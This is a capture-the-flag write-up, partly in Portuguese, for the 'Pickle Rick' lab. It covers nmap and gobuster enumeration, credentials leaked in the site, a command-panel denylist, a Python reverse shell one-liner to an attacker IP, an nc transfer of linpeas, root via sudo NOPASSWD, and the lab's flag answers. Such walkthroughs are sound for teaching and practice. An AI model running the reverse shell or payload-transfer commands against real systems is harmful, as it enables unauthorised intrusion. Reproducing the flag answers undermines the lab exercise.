# Lab: Pickle Rick (Easy Mode)

## TASKs:

1. **What is the first ingredient that Rick needs?** `mr. meeseek hair`
2. **What is the second ingredient in Rick’s potion?** `1 jerry tear`
3. **What is the last and final ingredient?** `fleeb juice`

---

```
export IP=10.10.89.179
```
```
ip addr show tun0 # 10.8.32.62/16
```

---

## 1) Enumeração com Nmap
```bash
nmap -A $IP
```
**Resultados:**
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```
**Fonte:** http://10.10.89.179/ -> **Username:** R1ckRul3s

---

## 2) Enumeração com Gobuster
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://$IP -x php,sh,txt,html,js,css,py
```
**Diretórios e Arquivos Encontrados:**
```
/assets/
/robots.txt -> Wubbalubbadubdub
/login.php -> Username: R1ckRul3s , Password: Wubbalubbadubdub
/portal.php -> (INFO: Após Login!) Command Panel: "ls", "less", "grep .", "grep -R ." -> (toda a info de todos os ficheiros)
```
**Flags Identificadas:**
```
Sup3rS3cretPickl3Ingred.txt: mr. meeseek hair (INFO: FLAG!)
clue.txt: Look around the file system for the other ingredient.
```
**Comandos Não Permitidos:**
```php
$cmds = array("cat", "head", "more", "tail", "nano", "vim", "vi");
```

**Possível Codificação Base64:**
```
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
```

---

## 3) Decodificação Base64
```bash
echo Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
```
**Resultado:**
```
rabbit hole
```

---

## 4) Verificação e Exploração Python
```bash
python3 -c "print('hello')" # Verificar se python3 está disponível
```
**Reverse Shell (Github Reverse Shell CheatSheet)**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.32.62",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
```
**Listener no Terminal:**
```bash
netcat -lnvp 9999
```

---

## 5) Estabilização de Shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
**Erros Possíveis:**
```
/bin/sh: 0: can't access tty; job control turned off
```
**Correção:**
```bash
export TERM=xterm
ls
```

---

## 6) Escalada de Privilégios
```bash
stabilize_shell3.sh
upload_file_nc.sh /opt/linpeas.sh
```
**Execução do Linpeas:**
```bash
nc -q 0 10.8.9.112 19934 > /dev/shm/lin
cd /dev/shm
ls # linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
**Identificação:**
```
(ALL) NOPASSWD: ALL (INFO: Acesso total sem senha)
```
**Escalação para Root:**
```bash
sudo bash
```
**Flags Encontradas:**
```bash
ls # 3rd.txt
cat 3rd.txt # feeb juice
```
**Exploração de Diretórios de Usuário:**
```bash
cd /home
ls # rick
cd rick/
ls # second ingredientes
cat * # 1 jerry tear
```
